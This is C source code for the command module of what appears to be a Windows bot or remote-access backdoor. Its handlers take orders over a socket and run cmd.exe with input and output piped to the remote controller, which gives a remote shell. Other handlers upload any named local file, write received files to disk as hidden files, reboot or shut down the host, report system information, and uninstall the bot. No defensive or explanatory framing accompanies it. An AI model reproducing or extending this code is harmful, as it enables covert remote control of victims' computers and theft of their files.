#include <stdint.h>

#include <winsock2.h>
#include <windows.h>

#include "commands.h"
#include "common.h"
#include "file.h"
#include "log.h"
#include "sock.h"
#include "str.h"
#include "corebot.h"
#include "coreinstall.h"
#include "util.h"

#include <windows.h>

#define BUF_SZ 1024
#define MAX_BLANKS 5

bool command_shutdown(struct bot *bot, struct command_ctx *ctx);
bool command_reboot(struct bot *bot, struct command_ctx *ctx);
bool command_get_client_info(struct bot *bot, struct command_ctx *ctx);
bool command_get_cli_mode(struct bot *bot, struct command_ctx *ctx);
bool command_send_file(struct bot *bot, struct command_ctx *ctx);
bool command_recv_file(struct bot *bot, struct command_ctx *ctx);
bool command_self_delete(struct bot *bot, struct command_ctx *ctx);

struct commands commands[] = {
	{ CMD_NOP, "\n", NULL }, 
	{ CMD_BYE, "bye-bye", NULL },
	{ CMD_SHUTDOWN, "shutdown", command_shutdown }, 
	{ CMD_REBOOT, "reboot", command_reboot },
	{ CMD_GET_INFO, "get_info", command_get_client_info },
	{ CMD_GET_CLI, "get_cli" , command_get_cli_mode }, 
	{ CMD_SLEEP, "sleep_me", NULL},
	{ CMD_RECV_FILE, "get_file", command_recv_file },
	{ CMD_SEND_FILE, "send_file", command_send_file },
	{ CMD_EXEC_FILE, "exec_file", NULL },
	{ CMD_SELF_DELETE, "self_delete", command_self_delete },
};

int
command_get(char *buf, int len, struct command_ctx *ctx)
{
	int i, n;

	assert(buf != NULL && ctx != NULL);

	for (i = 0; i < ARRSZ(commands); i++) {
		int ret, n;
		n = str_len(commands[i].name);
		ret = strncmp(commands[i].name, buf, n);
		if (ret == 0) {
			buf += n + 1;
			break;
		}
	}
	if (i == ARRSZ(commands)) {
		return CMD_UNKNOWN;
	}
	ctx->cmd = commands[i].id;

	switch (ctx->cmd) {
	case CMD_RECV_FILE:
	case CMD_SEND_FILE:
	case CMD_EXEC_FILE:
		n = OPT_MAXSZ - 1 > len ? len : OPT_MAXSZ;
		strncpy(ctx->path, buf, n);
		ctx->path[n + 1] = '\0';

		//remove unnecessary \n
		str_consume(ctx->path);

		DEBUG(LOG_VERBOSE, "get opt: %s\e", ctx->path);
		break;
	default:
		break;
	}
	DEBUG(LOG_VERBOSE, "command %d\n", ctx->cmd);
	return ctx->cmd;
}

bool
command_run(struct bot *bot, struct command_ctx *ctx)
{
	callback_t cb;
	int i;

	assert(bot != NULL && ctx != NULL);

	cb = NULL;
	for (i = 0; i < ARRSZ(commands); i++)
		if (commands[i].id == ctx->cmd)
			cb = commands[i].cb;
	
	if (cb == NULL) {
		DEBUG(LOG_DEFAULT, "null command handler, skipping\n");
		return true;
	}
	
	return cb(bot, ctx);
}

bool
is_pipe_empty(HANDLE h)
{
	int ret;
	DWORD avail;

	ret = PeekNamedPipe(h, //handle
	    NULL, //buffer
	    42, //bufsz (ignored)
	    NULL, //nr readed bytes
	    &avail, //nr bytes avail
	    NULL);
	if (ret == false) {
		DEBUG(LOG_DEFAULT, "PeekNamedPipe error\n");
		//FIXME: assume that pipe empty
		return true;
	} else if (avail > 0) {
		return false;
	} else {
		return true;
	}
}

bool
command_get_cli_mode(struct bot *bot, struct command_ctx *ctx)
{
	int ret;
	int blanks;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sattr;
	HANDLE rp_in, rp_out, wp_in, wp_out;

	assert(bot != NULL && ctx != NULL);

	DEBUG(LOG_DEFAULT, "try to get command line interface\n");
	
	ZeroMemory(&sattr, sizeof(sattr));
	sattr.nLength = sizeof(sattr);
	sattr.bInheritHandle = true;

	if (!CreatePipe(&rp_in, &wp_in, &sattr, 1024)) {
		DEBUG(LOG_DEFAULT, "create pipe error\n");
		return false;
	}
	if (!SetHandleInformation(wp_in, HANDLE_FLAG_INHERIT, 0))
		return false;
	if (!CreatePipe(&rp_out, &wp_out, &sattr, 1024)) {
		DEBUG(LOG_DEFAULT, "create pipe error\n");
		file_close(&rp_in);
		file_close(&wp_in);
		return false;
	}
	if (!SetHandleInformation(rp_out, HANDLE_FLAG_INHERIT, 0))
		return false;

	DEBUG(LOG_VERBOSE, "pipes created\n");
	
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.hStdInput = rp_in;
	si.hStdError = wp_out;
	si.hStdOutput = wp_out;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ret = CreateProcessA(NULL, "cmd.exe", NULL, NULL, true, 0, 
	    NULL, NULL, &si, &pi);
	if (ret == 0) {
		DEBUG(LOG_DEFAULT, "create pipe error\n");
		return false;
	}
	file_close(&rp_in);
	file_close(&wp_out);

	DEBUG(LOG_VERBOSE, "process created\n");

	blanks = 0;

	while (blanks < MAX_BLANKS) {
		DEBUG(LOG_VERBOSE, "next get_cli iter initiated\n");
		char buff[BUF_SZ + 1];
		int len;

		ZeroMemory(buff, sizeof(buff));
		if (is_pipe_empty(rp_out) == false) {
			do {
				ret = ReadFile(rp_out, (void *)buff, 
				    BUF_SZ, (LPDWORD)&len, NULL);
				if (ret == 0)
					goto finalize;
				DEBUG(LOG_VERBOSE, "read from pipe:%s\n", buff);

				ret = socket_send_msg(bot->socket, buff, len);
				if (ret == false)
					goto finalize;
			} while (is_pipe_empty(rp_out) == false);
		} else {
			len = sprintf(buff, "pipe read failed\n");
			blanks++;
			ret = socket_send_msg(bot->socket, buff, len);
			if (ret == false)
				goto finalize;
		}
		DEBUG(LOG_VERBOSE, "recieving next command...\n");
		ret = socket_recv_msg(bot->socket, buff, &len, BUF_SZ);
		if (ret == false) {
			blanks++;
		}
		ret = file_write_all(wp_in, buff, len);
		if (ret == false)
			goto finalize;
		DEBUG(LOG_VERBOSE, "end of get_cli_iter\n");
		if (bot->socket->is_closed == 1)
			break;

		my_usleep(30000);
	}
	DEBUG(LOG_DEFAULT, "out from get_cli_mode\n");

finalize:
	file_close(&wp_in);
	file_close(&rp_out);

	TerminateProcess(pi.hProcess, 1);

	return true;
}

bool
command_get_client_info(struct bot *bot, struct command_ctx *ctx)
{
	char buf[SYSINFO_SZ];
	bool ret;

	assert(bot != NULL && ctx != NULL);

	if (get_system_info(buf) == false)
		return false;
	ret = socket_send_msg(bot->socket, (char *)&buf, str_len(buf));

	if (ret == false) {
		DEBUG(LOG_DEFAULT, "can't set client information\n");
		return false;
	}

	return true;
}

bool
command_shutdown(struct bot *bot, struct command_ctx *ctx)
{
	assert(bot != NULL && ctx != NULL);

	DEBUG(LOG_DEFAULT, "recv shutdown command, dying\n");
	exit(0);
}

bool
command_reboot(struct bot *bot, struct command_ctx *ctx)
{
	assert(bot != NULL && ctx != NULL);

	DEBUG(LOG_DEFAULT, "recv reboot command\n");
	pc_reboot();
	return true;
}

bool
command_send_file(struct bot *bot, struct command_ctx *ctx)
{
	int flen;
	char *fname = NULL;
	HANDLE f;
	
	assert(bot != NULL && ctx != NULL);

	fname = ctx->path;

	f = file_open(fname, WO_EXCL | WO_READ, MOD_HIDDEN);
	if (f == INVALID_HANDLE_VALUE) {
		DEBUG(LOG_VERBOSE, "can't open file '%s'\n", fname);
		goto error;
	}

	flen = GetFileSize(f, NULL);
	if (flen == INVALID_FILE_SIZE) {
		DEBUG(LOG_VERBOSE, "get file size error\n");
		goto error;
	}

	DEBUG(LOG_VERBOSE, "need to send %d bytes\n", flen);
	//FIXME: mistake, need to get printable representation
	if (socket_send_msg(bot->socket, &flen, sizeof(flen)) == false)
		goto error;

	do {
		char buf[BUF_SZ];
		int ret, sndsz;

		sndsz = BUF_SZ < flen ? BUF_SZ : flen;

		ret = file_read_all(f, buf, sndsz);
		if (ret == false)
			goto error;

		ret = socket_send_msg(bot->socket, buf, sndsz);
		if (ret == false)
			goto error;
		flen -= sndsz;
	} while (flen > 0);
	
	file_close(f);

	return true;
error:
	DEBUG(LOG_DEFAULT, "send file error\n");
	return false;
}

//FIXME: WRITEME
bool
command_recv_file(struct bot *bot, struct command_ctx *ctx)
{
	char buf[BUF_SZ];
	int flen, n;
	char *fname = NULL;
	HANDLE f;

	assert(bot != NULL && ctx != NULL);

	fname = ctx->path;
	
	flen = 0;
	if (socket_recv_line(bot->socket, &buf, &n, sizeof(buf)) == false)
		goto error;
	str_consume(buf);
	if (!my_atoi(buf, &flen))
		goto error;

	DEBUG(LOG_VERBOSE, "need to recv %X bytes\n", flen);
	
	f = file_open(fname, WO_CREAT | WO_ALL, MOD_HIDDEN);
	if (f == INVALID_HANDLE_VALUE) {
		DEBUG(LOG_VERBOSE, "can't open file '%s'\n", fname);
		win_perror("win openfile");
		goto error;
	}

	do {
		int ret, len, rcvsz;

		len = BUF_SZ;
		rcvsz = BUF_SZ < flen ? BUF_SZ : flen;

		ret = socket_recv_msg(bot->socket, buf, &len, rcvsz);
		if (ret == false)
			goto error;
		ret = file_write_all(f, buf, len);
		if (ret == false)
			goto error;
		flen -= len;
	} while (flen > 0);
	
	file_close(f);

	return true;
error:
	DEBUG(LOG_DEFAULT, "recv file error\n");
	return false;
}

bool
command_self_delete(struct bot *bot, struct command_ctx *ctx)
{
	assert(bot != NULL && ctx != NULL);

	return self_uninstall();
}

